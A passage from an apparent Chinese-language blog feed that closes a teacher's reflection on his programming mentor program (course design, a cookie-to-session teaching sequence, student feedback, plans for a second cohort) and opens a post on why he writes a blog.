CI 跑測試，直接把結果回傳到 PR 上面，學生就能知道自己到底寫的是不是對的。</p><p>這部分我有特地寫一篇文章記錄下來：<a href="https://blog.techbridge.cc/2018/02/03/github-classroom-and-travis-ci/">利用 Github Classroom 加 Travis CI 打造改作業系統</a></p><p>以後我甚至想嘗試看看用 JIRA 開 ticket，例如說：week1 作業一、week1 作業二之類的，讓學生提早熟悉 JIRA 這套工具。</p><p>總之，我會在我實際的工作流程中找出可以移植到課程上面的，試著把它移植過來看看，目前看起來效果都挺不錯的。</p><h3 id="二、讓你有「切身之痛」的教學方式"><a href="#二、讓你有「切身之痛」的教學方式" class="headerlink" title="二、讓你有「切身之痛」的教學方式"></a>二、讓你有「切身之痛」的教學方式</h3><p>從我之前寫的那兩篇文章（<a href="http://零基礎的小明要如何成為前端工程師%EF%BC%9F">零基礎的小明要如何成為前端工程師？</a>、<a href="/2018/05/04/introduction-mvc-spa-and-ssr-545c941669e9/">跟著小明一起搞懂技術名詞：MVC、SPA 與 SSR</a>）就可以看出我的教學方式，我希望教學不是老師在台上講名詞，你在台下霧煞煞，而是從「原因」出發，讓你了解整個「脈絡」，你自然就會理解這一項東西。</p><p>簡單來說，就是回答底下這兩個問題：</p><ol><li>我們沒有這項技術的時候是什麼樣子，碰到了什麼困難？</li><li>接著這項技術出現了，解決了什麼問題？</li></ol><p>但比起我直接跟你說，如果能讓你<strong>親身經歷</strong>，或是讓你感受到<strong>切身之痛</strong>，那不是更棒的一件事嗎？「痛過你才會記得」，一直是我再三強調的教學理念，如果有一題面試題你答錯之後被狠狠洗臉，那題你保證不會忘掉。如果你的網站被駭客入侵，那修復漏洞的方法你也絕對不會忘。</p><p>舉個例子，一般常見的教學方式，如果要教 session 會怎麼教？大概會先講一下 session 的原理，說這個就像是通行證，然後是為了驗證身份等等，接著直接帶你用 framework 內建的 session 機制實現出一個簡單的會員系統。</p><p>但我是這樣教的：</p><ol><li>叫大家直接實作出一個可以登入登出的系統，並且跟他們講說：「這個原理很簡單，就是你登入之後把會員帳號寫在 cookie 裡面不就好了嗎？之後的 request 瀏覽器能夠把 cookie 帶上來，你就知道這個會員的帳號了」</li><li>實作出來之後跟他們說：「雖然這樣就能夠解決 HTTP 無狀態的問題，可是這樣又會有個新的問題。你看，我把存在 cookie 的會員帳號改掉，就可以用別人的身份登入了！」</li><li>那該怎麼辦呢？想想通行證是怎麼運作的，訪客驗證身份之後發給他一張證，認證不認人，看到那張證就代表你有通過驗證，並且可以知道你的身份。</li><li>我們就在 Server 實現一個通行證機制不就好了！資料庫開一個新的 table 來存通行證 ID（隨機產生）跟會員 ID，並且只把通行證 ID 寫到 cookie 裡，這樣儘管 cookie 可以竄改，但駭客卻沒辦法猜到我們隨機產生的通行證 ID。接著在 Server 端，我們拿到通行證 ID 的時候去查一下資料庫，就知道這個人是誰了。</li><li>接著讓學生去實作出這個作業，用資料庫來實作 session 機制。</li><li>下週上課的時候跟學生說：這個機制就叫做 session，你產生的通行證 ID 就叫做 session id，不過因為效率的緣故，通常我們不會用資料庫來實作，而是用一些 cache service 或是直接把這個資料存在記憶體裡面。</li><li>介紹 PHP 內建的 session 機制，下次作業就是用這機制把之前的程式碼改寫一遍</li></ol><p>透過這樣子的教學流程，可以保證幾件事情：</p><ol><li>學生不會搞混 cookie 跟 session</li><li>學生可以很明確知道 session 是拿來做什麼的</li><li>學生知道他用的 session_start() 這條指令背後的實作大概長怎樣</li></ol><p>同樣都是教 session，我自己認為目前的這個教學流程很不錯。我先「故意製造缺點」，再讓你自己去修補這個缺點，讓你<strong>親身經歷</strong>這個流程，就能知道為什麼我們需要 session。</p><h3 id="三、不斷思考教學方法的其他可能性"><a href="#三、不斷思考教學方法的其他可能性" class="headerlink" title="三、不斷思考教學方法的其他可能性"></a>三、不斷思考教學方法的其他可能性</h3><p>很多人會被自己以前受到的教學給侷限住。以前的老師怎麼教自己，自己就怎麼教學生。這樣的缺點就是沒辦法創新，使得教學的程度就停滯在那邊。</p><p>但我不一樣，我會一直去思考怎樣可以讓教學方式變得更好，這也是為什麼我把這個計畫稱為：程式導師「實驗」計畫，因為這整個教學方式本身就是一個實驗品，在教學的過程中我會不斷有新的想法，並且去想如何運用在以後的教學。</p><p>在這邊跟大家分享幾個我還沒實際嘗試但是有想過的教學方法：</p><ol><li>不要從 JavaScript，而是從組合語言開始教。背後的原因是我認為搞不好組合語言更適合入門，因為語法很簡單，指令又很少。比起高階語言的迴圈，組合語言的 label + jump 的方式可能更容易理解。我有想過要拿我大學修組語的時候用的 <a href="https://introcs.cs.princeton.edu/java/62toy/">TOY Machine</a> 來試試看，但研究一下發現語法有點小複雜，如果真的要拿組合語言來教學，自己寫一個很陽春的模擬器應該會比較好。</li><li>把學生分成兩組，各出一道不同的程式題目。規定程式變數名稱只能有一個字元（a-z）並且不能縮排不能有註解，寫完之後讓兩組互看對方寫的程式碼，試著猜出對方的題目是什麼。這個背後的目的是要讓大家理解程式碼的排版跟變數的取名有多麼重要。</li><li>看著 ECMAScript 的 spec 實作出某個內建的 function（例如說 Array.prototype.filter），idea 來自於上禮拜看 spec 的時候發現內建 function 的流程寫得很清楚，可以讓學生照著流程把文字轉換成 code，應該滿有趣的。</li></ol><p>總之我偶爾就會有這種教學的 idea，想拿到教學計畫中用用看，不知道實際的成效會如何，但一定很有趣。</p><h3 id="四、對「努力」的無限放大"><a href="#四、對「努力」的無限放大" class="headerlink" title="四、對「努力」的無限放大"></a>四、對「努力」的無限放大</h3><p>「身為學生，付出努力是最基本的，你要來上課、要寫作業。如果你不努力，那你當然學不會，這是你自己的問題，不是老師的」</p><p>我相信很多人這樣覺得，而這樣想也是合情合理的一件事情。</p><p>教學的互動是雙向的，學生自己可以再努力一點去學，而老師也可以再努力一點去教。大多數人都會覺得這種努力是有極限的，假設學生不學了，老師就沒有努力的空間。</p><p>可是我想把老師這段的努力給無限放大，我認為老師這端永遠可以再往前推進。意思就是如果學生不學了，老師可以試圖讓學生「產生學習的慾望」，而不是覺得學生不想學你就束手無策。</p><p>大多數人會把「努力」當作學生的「義務」而且是責任。如果學生不努力不用心，那就是他的問題。會把努力視為是一種責任，背後的預設是：「努力是一件你應該做而且你可以選擇做的事情，可是你選擇了懶惰，所以你這是你的責任」</p><p>但身為一個拖延症極度嚴重又極度懶惰的人，我認為有時候努力並不是一件你能夠掌握的東西，不是你想要努力就能夠努力的。換句話說，我不把努力看作是一種「你能選擇的」東西，我想把它當成是一種「天賦」。我想把「能努力」也當作天賦的一種，有些人生下來就是「想努力就能努力」，有些人生下來就是「想努力但卻沒辦法」。</p><p>天生智商就低的話沒人會責怪你，如果「能努力」也是一種天生的東西，那對於不努力的人我們也沒有理由責怪。（話說上面這段想法沒有任何科學證據佐證，純粹是「我想這麼相信」而已，理由無敵薄弱）</p><p>也就是說，我把這個責任扛到我身上。對我來說，我最終極的目標是<strong>要能夠讓一個學生對程式產生熱情、產生興趣</strong>，有了這兩項東西之後才能夠讓你維持動力，才能讓你願意自動自發學習程式。</p><p>但這要怎麼達成？我不知道，我也還在摸索。如果哪天我真的找到這種方法，會再跟大家分享的。</p><p>講了幾個我覺得做得不錯的點之後，就要來講一些可以再加強的地方了。不過在講這個之前，先讓我們來看一下學生們對我的反饋，也可以順便想想自己還有哪些地方可以加強。</p><h3 id="來自學生們的意見回饋"><a href="#來自學生們的意見回饋" class="headerlink" title="來自學生們的意見回饋"></a>來自學生們的意見回饋</h3><p># 1<br>這幾個月很完整的介紹了前後端的部分，其實在上課前我完全不懂前後端在幹嘛，只是因為想要轉職軟體工程師，所以相信自己對於這個應該能有興趣，也是最快能夠轉職的方法，但其實到了第四、五周，真的有花時間下去發現自己對這些部份實在是沒什麼熱忱，所以就….很可惜的沒有完成這些課程。 但也因為接觸過我才能去嘗試其他的領域，現在就在寫有關於影像處理的部分，一些程式設計的基礎也有很大的幫助。</p><p># 2<br>我覺得課程的面向很廣泛也很充實，從基本的 git, HTML, CSS, javascript ，到後端的 PHP, Nodejs ，基本的資訊安全概念及防護方法，如何設置網域還有虛擬主機，還有 gulp 及 webpack 等優化開發流程的方法，以及使用 React 製作 SPA App 等。可以算是對網站開發有全面性的認識</p><p>上課模式我蠻喜歡的，會先講解該工具或 library 的核心概念，讓我們知道為什麼需要這個東西？它解決或優化了網站開發的什麼問題？然後帶大家看一下 API 文件並 Demo 一下主要的功能，讓我們能很快了解這次要學的東西的輪廓，然後自己去摸索學習這樣，真的卡關了再去群組發問討論這樣。</p><p>遇到比較複雜或大型的作業會有 live coding 的解說，可以看到老師是如何組織程式的架構、命名變數、以及一些小技巧、跟最重要的如何 debug。 總之很謝謝老師還有一起上課的同學們，大家人都很好，都會幫忙解決其他人遇到的 bug ，或分享一些程式相關的心得文跟筆記，有機會的話其實蠻想看看其他同學到底長什麼樣子，哈哈!</p><p>上完這一套課程真的有開經驗值加倍衝等的感覺，不管是網站開發相關的知識、技術、經驗都提升了不少，我之後會繼續努力練功精進自己，希望能如願成為工程師。</p><p># 3<br>優點： <br>1. 老師的課程安排都是重點，進度也滿快的。<br>2. 上半段的作業設計很有結構。 <br>3. 問問題的時候，老師回覆的速度很快。</p><p>缺點： <br>1. 上半段的上課內容講解得比較細，重點提示明確；課程中後段的觀念講解，可能需要再詳細一些。中後段上課深度和作業難度之間的差距有點大，導致挫折感深，就會漸漸地想要放棄。 <br>2. 寫上課筆記會花太多的時間。建議能否將講義寫的詳細點，或是直接附上該觀念的資料連結。</p><p># 4<br>這個計畫最大的收穫，就是讓我明白自己當初到底有多廢。在這個計畫之前，光是 HTML&#x2F;CSS&#x2F;JS，我就覺得自己已經算是會很多了。直到參加計畫，我才發現很多我會的東西在專業工程師眼前就是一片小蛋糕，跟呼吸一樣是理所當然。</p><p>剛開始，還會覺得世界觀很崩潰。不過到後面也就習慣了….反正不會就學起來吧，然後慢慢就會變強了。藉由跟高手一步步學習，原本許多被大腦分類成「看起來很難耶，應該不用學吧」的知識會慢慢被轉變成那些「應該知道的基本功」。即使在學習的當下可能還不是很理解，但由於大腦已經對這些東西有印象，因此就會知道應該要把它當成學習目標。</p><p>因此比起某些具體的技術，我覺得「見識」是我在 Huli 身上覺得最有收穫的地方。他讓我們有機會可以看看一個專業人士眼中的「基礎」是什麼，讓我們能摸清自己的定位，而不是只會在一個人的小世界中自娛自樂。</p><p>因此真的要相當感激 Huli，謝謝世界上有像他們這些願意站出來做教學的人，因為有他們，我這樣的外行人才有機會可以看看高手眼中的世界是怎樣，並因此能有學習楷模與方向。謝謝 Huli。</p><p># 5 唯一一位找到工作的那位學生的心得<br>（<a href="https://github.com/Lidemy/mentor-program-kristxeng/issues/70">https://github.com/Lidemy/mentor-program-kristxeng/issues/70</a>）<br>先介紹一下我自己的背景，國立大學電機系畢業，不過畢業之後沒有從事過相關行業。到了現在年屆不惑大叔了才想要轉職，老實說我自己想到也著實抖了好幾下…</p><p>當初在報名 Mentor Program 的時候，huli 大的報名簡章要求每位同學每週應該要投入 40 小時在這個計畫。因為還在職中，所以一開始的規劃是平日每天下班後 4 小時、假日每天 10 小時的方式達到時數的要求。不過，實際執行的狀況大多是平日下班後，花在看課程影片、資料，和做作業的時間大約 2~3 小時，白天也盡量抓零碎時間來看相關資料，那陣子比較常看的是 <a href="https://pjchender.blogspot.com/2017/06/javascript-understanding-weird-part.html">PJCHENder 的 《JavaScript 全攻略：克服 JS 的奇怪部分》 的學習筆記</a>。而比較大的作業，大多留到周末假日，比較不會因為時間不夠被迫中斷思考。</p><p>正式上課之前，為了熟悉 huli 大上課的模式，有先瀏覽過 Lidemy 的 <a href="https://lidemy.teachable.com/p/frontend-intermediate-course">[FE201] 從新手到中手：前端工程加強班</a> 影片，之後在上 Mentor Program 課程的時候，對很多內容比較不陌生，也比較容易上手。對課程一開始會覺得蠻不習慣的地方，是還沒有看懂某一門技術在幹嘛，就要先用它來實作作業，不過在學習中後期會覺得這樣的編排其實很棒，因為光是聽課、看資料，很難真的瞭解這門技術的存在的理由？和它可以做到什麼？但什麼做不到？總是要在動手實作的時候，才會體會原來它是為了要達到什麼目的，或是它解決了其他技術的哪些痛點。</p><p>覺得缺憾的部分其實是在自己對學習沒有更好的認知跟規劃。例如明明是想找前端工作，但是 final project 因為時間的關係，卻沒有選擇用 React、SPA 來實作，反而讓作品顯得沒有這麼專注在前端。另外，在面試的過程中，不少公司會著重在有沒有與他人協作的經驗？這時候才會發現原來 huli 大在課程簡介裡標註 final project 可以找其他人合作，其實並不是因為擔心我們能力不足以完成 final project，而是能夠與別人合作良好，也是一種能力的展現。</p><p>看完了這些學生的意見回饋（按照慣例一刀未剪，我直接複製貼上），下面我提出了幾個自己可以再加強的地方，以及一些我一直在思考的點。</p><h3 id="一、教釣魚要教到什麼程度？"><a href="#一、教釣魚要教到什麼程度？" class="headerlink" title="一、教釣魚要教到什麼程度？"></a>一、教釣魚要教到什麼程度？</h3><p>大家都知道給他魚吃不如教他釣魚這個道理，但問題是要教到什麼程度？以一般線上課程來說，就是教得鉅細靡遺，越詳細越好，一步一步來，只要你願意跟著影片做，做完一次就都會了。</p><p>但我在想的問題是，如果你把這些東西全部都教給他了，會不會反而讓他缺少自己學習的能力？會不會哪天沒人教了，他自己就不知道該怎麼學習新的東西了？</p><p>這中間的尺度很難拿捏，一旦教得太少，你的課就淪為像是個導讀而不是一門完整的課程，如果教得太多，你又很難去評估這個學生有沒有自學能力。</p><p>舉<a href="https://blog.devdon.com/?p=4283">好想工作室</a>作為例子，他們選擇了什麼都不教。你有問題你可以問，然後那邊的人會給你一堆任務要你去做，但不會直接教你也不會上課。他們藉由這樣子的方式來培養自學能力，一旦結業了，就能確保你一定擁有自學能力——因為你就是這樣走過來的。</p><p>可是對我來說，我沒辦法把這整套拿來用，因為這需要時間。就跟寫程式一樣，一切都是 trade-off。如果你全部都讓學生自學，那四個月可能學生學會的東西不會那麼多，因為自己查資料自己整理重點都需要時間；但如果你全部都自己上課，那學會的技能可以很多，不過自學能力就會是零，因為你全部都教了，他們根本不用自己查資料。</p><p>當然啦，這選擇可以不用那麼極端，我覺得我現在的比重比較像是自學七、教學三，真的零基礎的同學在聽完我講課之後是有概念的，但還是沒辦法真的下去動手寫程式，因為有很多細節我都沒講。這時候學生就要自己去找其他線上課程來聽（就是教得很詳細的那種），這點其實我滿想改善的。</p><p>以後我課程的方向想要變成以導師計畫為主軸，帶你從零到一慢慢來，跟你說你這週應該要學什麼、下周應該要學什麼，但上課的時候我不講細節，只講重點跟脈絡。接著我必須先錄好一套線上課程，你在其他的時間可以自己看我的線上課程把那些細節補齊。</p><p>這樣的方式我覺得應該會滿不錯的，至少學生不用再向外去找其他課程，但缺點就是我必須要先把線上課程都準備好，應該會花不少時間。</p><h3 id="二、作業的設計以及難易度"><a href="#二、作業的設計以及難易度" class="headerlink" title="二、作業的設計以及難易度"></a>二、作業的設計以及難易度</h3><p>其實這點要承襲上面那題，我從 CS50 中學到的其中一件事情是：</p><blockquote><p>你上課可以上得很細節很基礎，把所有基本概念都講到；但是作業超出範圍，藉由這種方式來培養學生的自學能力。</p></blockquote><p>這方式我也覺得很不錯，課程前段我拿捏得應該還可以，但根據上面的意見反饋，課程後半段的差距就太大了，講解講得不夠細，作業又出的太難，導致這兩者落差太大，學生沒辦法適應。</p><p>CS50 的作業還分成兩種，一般版的跟進階版的，進階版的難度真的滿進階的。但在我的課程中不打算分成這兩種，我覺得學生作業會寫不完哈哈。</p><p>除此之外，還有一點是我能夠改進的，那就是作業的設計。</p><p>我記得之前有提過我理想中的作業，應該要能循序漸進並且有關聯性，才能讓學生在不知不覺中就做出了一個小作品，結業之後也能夠立刻就有東西放進作品集裡面。</p><p>這次我的作業主軸是「留言板」，從一開始就用這個當作業，接著慢慢改進它，例如說一開始用 PHP 寫，後來用 Node.js 重寫，最後再用 CodeIgniter 改寫原本的 PHP code。我覺得這方式不錯，但我希望作業能夠再多一點兩個主軸，例如說短網址系統或者是部落格都很好，以這三個為核心去發想作業，等學生修完整個課程，就立刻能有三個小作品，再花時間改一下就很完美了。</p><p>還有，讓學生練習接 API 也是滿重要的事情，這部分我給的範例太少了，最理想的狀況應該是讓他們 Facebook、Google 的 API 都接接看才對，而且這些也可以融入在作業裡面。</p><h3 id="三、虎頭蛇尾的課程設計"><a href="#三、虎頭蛇尾的課程設計" class="headerlink" title="三、虎頭蛇尾的課程設計"></a>三、虎頭蛇尾的課程設計</h3><p>在這個計畫開始之前，我已經規劃好的部分是前面 70%，後面 30% 只有大概想過要教什麼，但還沒有詳細地去設計。我原本想說反正還有時間，我就慢慢來就好，邊上課邊規劃後面的課程內容。</p><p>結果這樣樂觀的想法再加上懶惰的個性，就造成了後面的課程規劃用心程度跟前面落差太多，而且變來變去。</p><p>舉例來說，一開始原本跟大家講我最後面要上 Laravel，我那時抱持的想法是：「雖然我也不會，但應該不難，我先去學一下再來教大家基礎就好」，但後來發現沒想像中容易，而且就算我真的短時間內學會，我會的也是很皮毛的東西，根本就不應該拿來當作課程的一部分。而且 Laravel 的環境設置不是很好搞，Windows 有 wagon，可是 Mac 就要自己弄了，總之因為各種因素，最後改上了 CodeIgniter。</p><p>再來，就如同我學生所說的，後半段其實沒有銜接得很好，差距過大。我覺得落差最大的就是後面 React 跟 Redux 的部分，學生聽完我直播之後有點概念，可是真的要去寫的時候就完全不行，還是不知道怎麼寫。這部分我的問題很大，應該要規劃出能銜接得更好的教材才對，我相信我有這個能力。</p><h3 id="四、基礎不夠紮實"><a href="#四、基礎不夠紮實" class="headerlink" title="四、基礎不夠紮實"></a>四、基礎不夠紮實</h3><p>原本在規劃課程的時候以為自己把該涵蓋到的都涵蓋到了，但畢竟學海無涯嘛，講到的很多，沒講到的也很多。一直到後面我才陸陸續續發現自己有很多沒有提到的，並連帶造成了有些學生的基礎不太紮實。</p><p>在 Web 相關的基礎知識我覺得我都帶到了，但缺少的是有關於 JavaScript 以及一些計算機概論的部分。前者的話主要是有些東西不知道什麼時候講，怕太早講會混淆大家，可是太晚講學生又會碰到一堆問題不知道怎麼解，例如說「到底什麼是 this？」這一題應該就要早點講才對。</p><p>在 JavaScript 裡面很重要的 Promise 我也是到後期才提到，而且沒有講的很詳細，這些東西應該要銜接得更好講得更完整。</p><p>然後有關計算機概論的部分，這方面其實在課程中直接拿出來講有點突兀，要找一些方式融入進去。例如說剛開始講程式語言基礎時就可以出一題 0.1+0.2 其實不等於 0.3 之類的，就可以帶到數字在電腦裡是怎麼被儲存的，講到 CSS 的時候也可以順便帶到色碼跟十六進位。</p><p>講到陣列之類的地方也可以講個記憶體位置或是資料型態，其實有滿多方法可以把這些東西融入進去而不顯得突兀，只是要再多花點心思。關於這方面其實最理想的做法是等我的<a href="https://hahow.in/cr/cs-the-easy-way">初心者的計概與 coding 火球術</a>兩年期滿，這樣我就可以把它轉作免費課程，講到相關段落時附上參考連結，直接讓學生去看就行了。</p><p>怕我自己忘記，下面列舉一下我之後想讓學生加強的基礎：</p><p>1.在程式裡的 heap 與 stack<br>2. JavaScript 的變數提升<br>3. JavaScript 的 this<br>4. JavaScript 的原型鍊<br>5. IIFE<br>6. 閉包 closure<br>7. 事件冒泡<br>8. Promise<br>9. 基本資料結構與演算法<br>10. 各種排序法以及 Big O<br>11. 各種進位制</p><p>不過就如同前面說的一樣，最理想的形式是導讀只講重點，其他時間讓學生自己看線上課程鍛鍊基礎。上面這些東西放導讀的話應該講不完，挪到線上課程裡面去比較好。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>很感謝每位學生的參與以及意見回饋，有了這些回饋我才能進一步改善我的課程。而身為一個習慣反思的人，也不斷從教學的過程中發現有許多可以改進的地方。</p><p>最後，有個很多人問的問題我在這邊統一回答：</p><blockquote><p>這個計劃會有第二期嗎？</p></blockquote><p>老實說，我一開始的答案是 No，暫時不會有。</p><p>原因很簡單，那就是我想休息一下，因為我的惰性又犯了。可是每當我看見其他線上課程的銷售廣告，我就會在心裡想說：「我覺得我能教得比較好」，尤其是近期程式的課程越來越多，就讓我更想證明這件事（或是被打臉，發現自己教的爛透了嗚嗚）。</p><p>所以我的答案要改口為：「很有可能會有」，如果有的話，時間可能會在八月底或者是九月初，意思是要招生的話可能七月中或是八月初會開始招生。</p><p>至於形式的話我還要再想一下，但原本的每週直播三次可能會變成直播一次，其他進度我就直接拿第一期的直播影片來放，畢竟內容如果重複性很大的話，影片會比直播更有效率一點（對我來說啦）。</p><p>如果你看完了這個心得，覺得對這個計畫依然很有興趣，不想錯過第二期的機會，可以填寫下面這個 Google 表單，在正式招生的時候就會收到通知：<a href="https://goo.gl/forms/um5znnJg7U6H3nBB2">https://goo.gl/forms/um5znnJg7U6H3nBB2</a>。</p><p>最後，再次感謝大家的觀看，也感謝學生、感謝小老師們、感謝自己。希望第二期能做得更好。</p><p>還有一件事情，一開始 po 文的時候忘了說，我把第一期導師計畫前半段課程的直播都公開在 Youtube 了，對課程有興趣的人可以自己去看看：<a href="https://www.youtube.com/playlist?list=PLeWlPscCzV-e-EeGkrYKHavBnYSzJ4gMw">https://www.youtube.com/playlist?list=PLeWlPscCzV-e-EeGkrYKHavBnYSzJ4gMw</a></p><p>為什麼會這樣公開呢？很簡單，我比你還怕你選錯課程，先讓你試看有個保障，假設我以後有線上課程也會是同樣的做法，直接把一半公開讓你試看。</p><p>如果你看完前半段之後想要看後半段的課程，可以到 <a href="https://www.lidemy.com/p/mtr01">Lidemy</a> 的網站去付費購買。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我為什麼寫部落格，以及部落格帶給我的影響</title>
      <link href="/2018/06/14/blog-e7a23a74ae2b/"/>
      <url>/2018/06/14/blog-e7a23a74ae2b/</url>
      
        <content type="html"><![CDATA[<p>前幾天有個朋友問了我一個問題：</p><blockquote><p>請問你一路走來，寫部落格有帶給你什麼影響嗎？例如說學習相關的或者是求職方面的？</p></blockquote><p>後來我稍微跟她小聊了一下，交換了一下想法。但被問到這個問題的時候我的第一個想法其實是：那就寫一篇來回答吧！</p><p>先說一下，其實一年前我寫過一篇類似的：<a href="http://huli.logdown.com/posts/1880993-the-benefits-of-writing-blog">寫 blog 的好處</a></p><p>但過了一年其實想法有些改變，然後這篇的切入點也會比較不同，所以還是又寫了一篇新的。</p><h3 id="我為什麼寫部落格？"><a href="#我為什麼寫部落格？" class="headerlink" title="我為什麼寫部落格？"></a>我為什麼寫部落格？</h3><p>第一個原因是我喜歡寫東西，第二個原因是我喜歡分享，第三個原因是我把它當筆記在用，就這樣。</p><p>不是為了名氣、不是為了流量、不是為了讓自己能得到什麼好處。</p><p>如果你想知道我寫東西的歷程，以及那些經歷對我的影響以及幫助，可以看這篇：<a href="https://medium.com/@hulitw/%E5%BB%A2%E6%96%87%E5%B7%A5%E4%BD%9C%E8%80%85%E7%9A%84%E9%A4%8A%E6%88%90-d05a5b7e539">廢文工作者的養成</a></p><p>懶得看的話，總之就是從小就很喜歡寫一些東西，自從電腦出現以後就喜歡用打字的，寫一些非技術文章的話，一個小時可以產出五千字左右，這點其實對寫文章幫助很大很大。</p><p>我人生中的第一個技術部落格是在我國二的時候，跟朋友合租了一個網路空間，自己架了 wordpress，那時候寫的除了技術以外還有一些跟網路相關的文章，取得流量的來源是把文章貼到 funp 推推王上面去，還可以拿一些點數去換獎品。</p><p>可是那部落格大概寫了半年左右就沒有再繼續經營了，原因很簡單，就是懶惰。</p><p>再下一次寫技術部落格，是我大學開始去新創公司實習以後，那時候想說工作上應該有滿多東西需要記起來，於是就開個 Blog 當筆記來用，你看我部落格的<a href="http://huli.logdown.com/posts/189427-corona-sdk-notes">第一篇文章</a>，真的是當筆記用，沒有在唬爛你：</p><p><img src="/img/blog-e7a23a74ae2b/1____GMOCNBTWPHPErLPQPIQ__A.png"></p><p>那時的文章基本上都是這種風格，純粹當筆記用，或者寫一些很短的心得，跟現在的風格差異很大。其實就是把部落格當作 Evernote 在用，反正部落格本來就是你想寫什麼就寫什麼，沒人規定部落格一定要長文才叫做部落格，搞不好我哪天就發個只有三個字「大家好」的廢文。</p><p>而真正使我發現寫部落格會有額外效益的，是因為這篇文：<a href="http://huli.logdown.com/posts/202932-briefly-analyses-anonymous-fans-page">簡略分析最近爆紅的匿名粉絲專頁</a></p><p>當初會寫這篇是因為身為一個資深鄉民，對這個現象真的很有感，就是一種：「我有很多話想說，我真的對這個很有心得，我一定要講」的心情。</p><p>寫完之後除了 po 到自己臉書以外也沒有特別分享到哪裡去，直到過了幾個月，我突然收到那個匿名粉專系統創辦人的來信，跟我說我寫的分析很有趣，之後也來來回回交換了一些意見。</p><p>然後某天我到 GA 的後台去看，發現我的部落格流量大增，而且居然有 75% 的流量都是來自於這篇文章。</p><p>除此之外，還有其他的一些關鍵字也能夠搜尋到我的部落格，我那時在個人臉書上面發了這樣一則動態：</p><blockquote><p>「簡略分析最近爆紅的匿名粉絲專頁」這篇文章讓我的 blog 的訪客數量暴增，一直至今日也是，有大約 75%的到達網頁就是這篇文章，為什麼這篇會那麼紅我也不懂。</p></blockquote><blockquote><p>後來我用網站管理員工具看了一下，發現用很多關鍵字我的這篇文章都會排很前面，像是 anonymonkey、fb 匿名、匿名 po 文等等的相似關鍵字，這篇文章都排在前五名，有些甚至還排在第一名，而且因為這篇文章獲得的額外收穫是，這個 team 的成員找上我了。</p></blockquote><blockquote><p>有天突然收到 AnonyMonkey 的 founder 寄來的信讓我又驚又喜，顯然他們也看過我寫的那篇文章，想問我一些其他的建議，後續我們又來往大約二十幾封信件，談一些跟匿名有關的機制跟優缺點，還有談談自己，之前八卦版有人爆料說創辦人是中國人，是阿沒錯，但是關於其他的推論我就不太相信了，根據我自己跟他聊天的經驗，他只是純粹想推動匿名平台，達成一些實名制做不到的事情，甚至促成一些好姻緣（像之前上新聞的那對），跟學運或是共產黨一點關係都沒有，至少我是這樣相信的。</p></blockquote><blockquote><p>除此之外，我看了看其他我的部落格的熱門關鍵字，猛然發現搜尋「mailgun」，我的文章會出現在第二個，也就是在 mailgun 的官方網頁下面，我還特地請朋友也幫忙搜尋一次（我怕只有我搜尋是這樣，儘管我開無痕模式），那是因為之前剛好要用這個服務，所以順手把一些心得記下來，沒想到獲得這麼意外的成效。</p></blockquote><blockquote><p>還有，之前有一篇文章叫做「設計師自學完全手冊」，是國外的文章然後有人把它翻譯，裡面有提到許多本書，我發了一篇文章是把裡面提到的書找出中譯本來，然後整理了一份書單，就這樣而已，然後現在如果搜尋「自學設計」，第一名是原本那篇文章，第二名就是我這篇書單的文章。</p></blockquote><blockquote><p>前陣子有研究了一下 Facebook 的 API 如何使用，也是寫了一篇文章記錄心得還有做了個小東西，現在搜尋「fb api」，也一樣可以在第一頁就找到我那篇文章。</p></blockquote><blockquote><p>當初第一次發現上面這些事情的時候，我嚇了一大跳！「原來排名要排前面一點好像不是件難事」，因為我以前一直以為要排前面很難，不過現在還是覺得很難啦，畢竟這種東西跟用什麼關鍵字息息相關，不過上面提到的這些關鍵字我覺得還算常見，所以我滿滿意的。</p></blockquote><blockquote><p>總而言之，以上各種小確幸都幫助我增加一點自信跟寫部落格的動力，有些順手寫的文章，卻達成出乎意料的效果。所以，我覺得大家都應該來寫個部落格，無論是什麼題材都可以，只要你有東西想寫就可以寫，說不定有天也發現你的部落格的某篇文章突然很紅。</p></blockquote><p>「原來我寫的那些東西有人看」，這點會帶給你一些自信跟動力，因為你知道有人在看，也知道你寫的東西是有價值的。不過就算沒人看，我想我也還是會繼續寫。</p><p>我把寫部落格當作興趣，這是很重要的一件事。有人的興趣是打籃球，有人的興趣是逛街，有人的興趣是寫作，而部落格當然也可以當作一種興趣。我朋友問我說：「有人會忙著工作跟學習，所以很難維持寫部落格的習慣，你都是在什麼時間寫部落格？」</p><p>我回她：</p><blockquote><p>那是因為很多人把寫部落格當工具而不是當興趣，自然就很難維持。像是你如果為了減肥去健身，哪天懶惰了不想減肥了你就不去了，可是如果你真的把健身當興趣，你就算不用減肥你也會去</p></blockquote><p>這道理十分簡單，我寫部落格是因為我喜歡寫，寫部落格就是我的目的，而不是一種獲益的手段。就像是唸書的時候為了成績為了考試逼自己唸書，可是畢業之後沒有了這些「目的」，於是當初那些拿來當作手段的書本就再也沒有打開過。</p><p>可是如果你本來就是一個喜歡看書的人，不用考試你也會自己去看書。因為你喜歡嘛！別人假日出去踏青逛街，我假日都宅在家寫文章。</p><p>我從來不強迫我的學生寫部落格。我只會跟他們說：「你可以試著寫寫看，想寫什麼就寫什麼，可以拿來隨手記一些上課的心得，但你不想寫也沒關係」，強迫是沒有用的，這點我們自己應該最心知肚明。</p><p>不過如果你確實喜歡寫，可是只是比較懶惰的話，適當的強迫還是可以的。例如說我跟幾個朋友經營的 <a href="https://blog.techbridge.cc/">TechBridge 技術共筆部落格</a>，就規定每個人一個月要寫一篇文章，而且因為是每個月一篇，所以都會覺得自己不能寫得太草率，就會更花心思去寫。</p><p>有時候禮拜六花了六七小時寫一篇也是有可能的，但寫出來的東西通常自己都滿滿意的。我有很多滿熱門的文章就是從那個部落格出現的。這樣適當的強迫可以壓抑自己的惰性，這是我覺得很實用的方法，分享給大家。</p><p>而隨著文章的質跟量慢慢提升以後，有些好處自然就跟著來了。</p><h3 id="寫部落格帶給我的影響"><a href="#寫部落格帶給我的影響" class="headerlink" 